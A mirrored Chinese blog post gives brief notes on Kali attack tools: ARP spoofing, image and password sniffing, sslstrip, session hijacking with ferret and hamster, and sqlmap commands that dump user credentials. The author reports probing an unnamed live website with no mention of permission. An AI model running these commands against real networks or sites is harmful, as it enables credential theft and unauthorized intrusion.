@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<!-- Mirrored from www.cnblogs.com/xinxianquan/p/9735720.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Jun 2019 01:25:37 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="referrer" content="origin" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <title>kali 局域网嗅探 - 疏桐 - 博客园</title>
+    <meta property="og:description" content="1、局域网图片嗅探 工具 arpspoof arpspoof -i eth0 -t 192.1681.10(网卡 目标地址) 192.168.1.1 局域网网关，如果在Windows中可以使用局域网扫" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/bundles/blog-common.css?v=KOZafwuaDasEedEenI5aTy8aXH0epbm6VUJ0v3vsT_Q1"/>
+<link id="MainCss" type="text/css" rel="stylesheet" href="https://www.cnblogs.com/skins/UnlimitedSunlight/bundle-UnlimitedSunlight.css?v=U277U0wIYS14CMa8eCm6JCKf6HhAx4Z-aYITTLKh93g1"/>
+<link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="https://www.cnblogs.com/skins/UnlimitedSunlight/bundle-UnlimitedSunlight-mobile.css?v=4ln6fqVq4L4pRmW24O2dfYf_4JqJC33CU4WevG-lN0o1"/>
+    <link title="RSS" type="application/rss+xml" rel="alternate" href="http://feed.cnblogs.com/blog/u/395031/rss"/>
+    <link title="RSD" type="application/rsd+xml" rel="EditURI" href="../rsd.xml"/>
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="../wlwmanifest.xml"/>
+    <script src="http://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script>var currentBlogId=395031;var currentBlogApp='xinxianquan',cb_enable_mathjax=true;var isLogined=false;</script>
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']], processClass: 'math', processEscapes: true },
+        TeX: { 
+            equationNumbers: { autoNumber: ['AMS'], useLabelIds: true }, 
+            extensions: ['extpfeil.js'],
+            Macros: {bm: "\\boldsymbol"}
+        },
+        'HTML-CSS': { linebreaks: { automatic: true } },
+        SVG: { linebreaks: { automatic: true } }
+        });
+    </script><script src="http://mathjax.cnblogs.com/2_7_2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="https://www.cnblogs.com/bundles/blog-common.js?v=smtcUT5dhdu_5eEO8CKHYoVc7DPLgEBGzp6zKkstlzg1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+
+
+<!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+	<a id="lnkBlogLogo" href="../index.html"><img id="blogLogo" src="https://www.cnblogs.com/Skins/custom/images/logo.gif" alt="返回主页" /></a>			
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle" href="../index.html">疏桐</a></h1>
+<h2>疏桐不懈的渗透测试之路</h2>
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">博客园</a></li>
+<li><a id="blog_nav_myhome" class="menu" href="../index.html">首页</a></li>
+<li><a id="blog_nav_newpost" class="menu" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a></li>
+<li><a id="blog_nav_contact" class="menu" rel="nofollow" href="https://msg.cnblogs.com/send/疏桐">联系</a></li>
+<li><a id="blog_nav_rss" class="menu" href="http://feed.cnblogs.com/blog/u/395031/rss">订阅</a>
+<!--<a id="blog_nav_rss_image" class="aHeaderXML" href="https://www.cnblogs.com/xinxianquan/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a>--></li>
+<li><a id="blog_nav_admin" class="menu" rel="nofollow" href="https://i.cnblogs.com/">管理</a></li>
+</ul>
+		<div class="blogStats">
+			
+			<div id="blog_stats">
+<span id="stats_post_count">随笔 - 287&nbsp; </span>
+<span id="stats_article_count">文章 - 13&nbsp; </span>
+<span id="stats-comment_count">评论 - 2</span>
+</div>
+			
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		
+        <div id="post_detail">
+<!--done-->
+<div id="topics">
+	<div class = "post">
+		<h1 class = "postTitle">
+			<a id="cb_post_title_url" class="postTitle2" href="9735720.html">kali 局域网嗅探</a>
+		</h1>
+		<div class="clear"></div>
+		<div class="postBody">
+			<div id="cnblogs_post_body" class="blogpost-body"><p>1、局域网图片嗅探</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 工具&nbsp; arpspoof</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp; arpspoof -i eth0 -t 192.1681.10(网卡 目标地址) 192.168.1.1 局域网网关，如果在Windows中可以使用局域网扫描工具&nbsp; Advanced ip Scanner</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; linux中 扫描局域网在线的主机 fping -asg 192.168.1.0/24&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181001190331331-2094827701.png" alt="" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 欺骗的同时不能是对方断网，使用流量转发&nbsp; echo 1 &gt;/proc/sys/net/ipv4/ip_forward &nbsp;&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检查是否成功执行&nbsp;&nbsp;&nbsp;&nbsp; cat&nbsp; proc/sys/sys/net/ipv4/ip_forward&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 获取本机网卡的图片&nbsp;&nbsp; driftnet -i eth0 </p>
+<p><img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181001192408433-1389122282.png" alt="" /></p>
+<p>2、密码嗅探 &lt;http&gt;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 先使用欺骗命令 arpspoof </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; ettercap -Tq - i eth0 </p>
+<p>&nbsp;&nbsp;&nbsp; <img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181001195008784-436779346.png" alt="" /></p>
+<p>3、ssh远程连接操作&nbsp; 链接kali&nbsp; shell模式注销</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; ctrl +Alt +F1&nbsp;&nbsp; 切换到 命令行模式</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用命令&nbsp;&nbsp; /etc/init.d/ssh&nbsp; start </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用Xshell 链接kali ip </p>
+<p>4、抓包https流量</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 首先编辑&nbsp;&nbsp;&nbsp; vim /etc/ettercap/etter.conf &nbsp; 修改&nbsp; ****linux **&nbsp; 取消 #</p>
+<p>&nbsp;&nbsp;&nbsp; 开启 sslstrip -a -f -k</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 开启欺骗&nbsp; arpspoof&nbsp; 同时转发流量&nbsp; </p>
+<p>&nbsp;&nbsp; 在https 网址上进行登陆 抓取流量</p>
+<p><img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181001204813160-1685881845.png" alt="" /></p>
+<p>&nbsp;5、会话劫持登陆已经被别人登陆的网站</p>
+<p>&nbsp;&nbsp;&nbsp; 快速添加之前使用的命令&nbsp; ！ + 部分命令&nbsp; 就会补全</p>
+<p>&nbsp;&nbsp;&nbsp; 先使用arpspoof 欺骗 同时流量转发</p>
+<p>&nbsp;&nbsp;&nbsp; 使用 wireshark 流量抓包工具</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 使用 ferret 重新生成抓包的工具</p>
+<p>&nbsp; &nbsp;&nbsp; ferret&nbsp; -r&nbsp; j加上 抓取的流量包&nbsp; 会生成一个 txt文件</p>
+<p>&nbsp;&nbsp;&nbsp; 使用 hamster&nbsp; -h打开一个浏览器 &nbsp; &nbsp; &nbsp;&nbsp; -----》 设置代理和端口 &nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp; 或者不适用欺骗，直接使用 ferret -i eth0&nbsp; 然后使用 hamster&nbsp; 浏览网页&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp; 另外基于界面的软件 cookieCadger</p>
+<p>6、sqlmap 对asp网站的检测</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlmap -u "www.baidu.com.id=2"&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlmap -u "www.baidu.com.id=2" &nbsp; --tables </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; sqlmap -u "www.baidu.com.id=2"&nbsp;&nbsp;&nbsp;&nbsp; --columns -T&nbsp; "user" </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sqlmap -u "www.baidu.com.id=2"&nbsp; --dump&nbsp; -C "username ,password" -T "user"</p>
+<p>&nbsp;&nbsp;&nbsp; cookie使用&nbsp;&nbsp; &nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp;&nbsp; --cookie "id=23" --level=2 </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>7、sqlmap 对php网站的检测</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp; --is-dba&nbsp;&nbsp; 检测是否是dba 形式&nbsp; （可以将文件写入目录）</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp; --dbs&nbsp;&nbsp; (列出所有的数据库)</p>
+<p>&nbsp;&nbsp;&nbsp; &nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp;&nbsp; --current-db&nbsp;&nbsp;&nbsp;&nbsp; (猜测当前的数据库)</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp; --tables -D "admin"&nbsp;&nbsp; (根据admin数据库猜测表名)</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp;&nbsp; --columns -T "pss"&nbsp; -D "admin"</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; sqlmap -u &ldquo;&nbsp; www.baidu.com.php.id=2&rdquo;&nbsp; --dump&nbsp; -C "username,password " -T "pss"&nbsp; -D "admin"</p>
+<p>8、实例检测</p>
+<p>&nbsp;&nbsp; 下面是我检测的一个网上的PHP的网站 存在SQL注入的漏洞</p>
+<p><img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181002095829838-1530901851.png" alt="" /></p>
+<p>9、Metasploit</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; msfconsole </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 这一节我之前的微博已经写过很多，不过还没哟整理，想着抽空整理一遍</p>
+<p>&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>10、流量分析工具 nload</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附： 卸载之前暗转的软件 apt-get remove&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复没有成功安装的软件&nbsp;&nbsp; apt --fix-broken install </p>
+<p><img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181002205243189-1305697714.png" alt="" /></p>
+<p>11、metasploit</p>
+<p>&nbsp;&nbsp;&nbsp; 使用Metasploit 辅助模块 wmap进行扫描（对网站进行集中的扫描）</p>
+<p><img src="https://img2018.cnblogs.com/blog/1276904/201810/1276904-20181005151716549-751755912.png" alt="" /></p>
+<p>&nbsp;&nbsp;&nbsp; 使用Sqlmap辅助模块进行扫描：</p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp; </p>
+<p>&nbsp;</p></div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+
+
+		</div>
+		<div class = "postDesc">posted @ <span id="post-date">2018-10-02 21:09</span> <a href='../index.html'>疏桐</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href ="https://i.cnblogs.com/EditPosts.aspx?postid=9735720" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(9735720);return false;">收藏</a></div>
+	</div>
+	<script type="text/javascript">var allowComments=true,cb_blogId=395031,cb_entryId=9735720,cb_blogApp=currentBlogApp,cb_blogUserGuid='98a452d3-9c6b-41c0-b8f3-08d523685c8c',cb_entryCreatedDate='2018/10/2 21:09:00';loadViewCount(cb_entryId);var cb_postType=1;var isMarkdown=false;</script>
+	
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div id='comment_form' class='commentform'>
+<a name='commentform'></a>
+<div id='divCommentShow'></div>
+<div id='comment_nav'><span id='span_refresh_tips'></span><a href='javascript:void(0);' onclick='return RefreshCommentList();' id='lnk_RefreshComments' runat='server' clientidmode='Static'>刷新评论</a><a href='#' onclick='return RefreshPage();'>刷新页面</a><a href='#top'>返回顶部</a></div>
+<div id='comment_form_container'></div>
+<div class='ad_text_commentbox' id='ad_text_under_commentbox'></div>
+<div id='ad_t2'></div>
+<div id='opt_under_post'></div>
+<script async='async' src='https://www.googletagservices.com/tag/js/gpt.js'></script>
+<script>
+  var googletag = googletag || {};
+  googletag.cmd = googletag.cmd || [];
+</script>
+<script>
+  googletag.cmd.push(function() {
+        googletag.defineSlot('/1090369/C1', [300, 250], 'div-gpt-ad-1546353474406-0').addService(googletag.pubads());
+        googletag.defineSlot('/1090369/C2', [468, 60], 'div-gpt-ad-1539008685004-0').addService(googletag.pubads());
+        googletag.pubads().enableSingleRequest();
+        googletag.enableServices();
+  });
+</script>
+<div id='cnblogs_c1' class='c_ad_block'>
+    <div id='div-gpt-ad-1546353474406-0' style='height:250px; width:300px;'></div>
+</div>
+<div id='under_post_news'></div>
+<div id='cnblogs_c2' class='c_ad_block'>
+    <div id='div-gpt-ad-1539008685004-0' style='height:60px; width:468px;'></div>
+</div>
+<div id='under_post_kb'></div>
+<div id='HistoryToday' class='c_ad_block'></div>
+<script type='text/javascript'>
+ if(enablePostBottom()) {
+    codeHighlight();
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverT2();
+    deliverC1();
+    deliverC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);  
+}
+</script>
+</div>
+
+    
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+	<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+
+			<div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script>
+			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+			</div>
+			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		
+<!--done-->
+Copyright &copy;2019 疏桐
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+<!--PageEndHtml Block Begin-->
+<script>
+ 
+!function(){
+ 
+ function n(n,e,t){
+ 
+ return n.getAttribute(e)||t
+ 
+ }
+ 
+ function e(n){
+ 
+ return document.getElementsByTagName(n)
+ 
+ }
+ 
+ function t(){
+ 
+ var t=e("script"),o=t.length,i=t[o-1];
+ 
+ return{
+ 
+ l:o,z:n(i,"zIndex",-1),o:n(i,"opacity",.5),c:n(i,"color","0,0,0"),n:n(i,"count",99)
+ 
+ }
+ 
+ }
+ 
+ function o(){
+ 
+ a=m.width=window.innerWidth||document.documentElement.clientWidth||document.body.clientWidth,
+ 
+ c=m.height=window.innerHeight||document.documentElement.clientHeight||document.body.clientHeight
+ 
+ }
+ 
+ function i(){
+ 
+ r.clearRect(0,0,a,c);
+ 
+ var n,e,t,o,m,l;
+ 
+ s.forEach(function(i,x){
+ 
+ for(i.x+=i.xa,i.y+=i.ya,i.xa*=i.x>a||i.x<0?-1:1,i.ya*=i.y>c||i.y<0?-1:1,r.fillRect(i.x-.5,i.y-.5,1,1),e=x+1;e<u.length;e++)n=u[e],
+ 
+ null!==n.x&&null!==n.y&&(o=i.x-n.x,m=i.y-n.y,
+ 
+ l=o*o+m*m,l<n.max&&(n===y&&l>=n.max/2&&(i.x-=.03*o,i.y-=.03*m),
+ 
+ t=(n.max-l)/n.max,r.beginPath(),r.lineWidth=t/2,r.strokeStyle="rgba("+d.c+","+(t+.2)+")",r.moveTo(i.x,i.y),r.lineTo(n.x,n.y),r.stroke()))
+ 
+ }),
+
+ x(i)
+ 
+ }
+ 
+ var a,c,u,m=document.createElement("canvas"),
+ 
+ d=t(),l="c_n"+d.l,r=m.getContext("2d"),
+x=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||
+ 
+ function(n){
+
+ window.setTimeout(n,1e3/45)
+ 
+ },
+ 
+ w=Math.random,y={x:null,y:null,max:2e4};m.id=l,m.style.cssText="position:fixed;top:0;left:0;z-index:"+d.z+";opacity:"+d.o,e("body")[0].appendChild(m),o(),window.onresize=o,
+ 
+ window.onmousemove=function(n){
+ 
+ n=n||window.event,y.x=n.clientX,y.y=n.clientY
+ 
+ },
+ 
+ window.onmouseout=function(){
+ 
+ y.x=null,y.y=null
+ 
+ };
+ 
+ for(var s=[],f=0;d.n>f;f++){
+ 
+ var h=w()*a,g=w()*c,v=2*w()-1,p=2*w()-1;s.push({x:h,y:g,xa:v,ya:p,max:6e3})
+ 
+ }
+ 
+ u=s.concat([y]),
+ 
+ setTimeout(function(){i()},100)
+ 
+ }();
+ 
+ </script>
+<!--PageEndHtml Block End-->
+</body>
+
+<!-- Mirrored from www.cnblogs.com/xinxianquan/p/9735720.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 09 Jun 2019 01:25:37 GMT -->
+</html>
